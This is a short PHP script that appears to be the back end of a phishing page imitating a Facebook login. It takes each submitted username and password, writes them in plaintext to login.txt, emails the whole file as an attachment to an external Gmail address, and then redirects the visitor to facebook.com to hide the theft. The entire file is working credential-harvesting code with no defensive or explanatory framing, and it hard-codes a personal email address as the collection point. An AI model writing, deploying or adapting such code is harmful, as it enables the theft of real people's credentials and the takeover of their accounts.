<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Save login details to file
    $file = 'login.txt';
    $data = "Username: $username\nPassword: $password\n------------------\n";
    file_put_contents($file, $data, FILE_APPEND);
    
    // Send email notification
    $to = "worldson70@gmail.com";
    $subject = "New Login Detected";
    $message = "A user has logged in. See the attached login.txt file for details.";
    
    // Email headers
    $boundary = md5(time());
    $headers = "From: admin@yourwebsite.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n";
    
    // Email body
    $emailBody = "--$boundary\r\n";
    $emailBody .= "Content-Type: text/plain; charset=UTF-8\r\n";
    $emailBody .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
    $emailBody .= "$message\r\n\r\n";
    
    // Attach login.txt
    if (file_exists($file)) {
        $fileContent = chunk_split(base64_encode(file_get_contents($file)));
        $emailBody .= "--$boundary\r\n";
        $emailBody .= "Content-Type: text/plain; name=\"login.txt\"\r\n";
        $emailBody .= "Content-Disposition: attachment; filename=\"login.txt\"\r\n";
        $emailBody .= "Content-Transfer-Encoding: base64\r\n\r\n";
        $emailBody .= "$fileContent\r\n\r\n";
        $emailBody .= "--$boundary--";
    }

    // Send email
    mail($to, $subject, $emailBody, $headers);

    // Redirect to Facebook after login
    header("Location: https://www.facebook.com");
    exit();
}
?>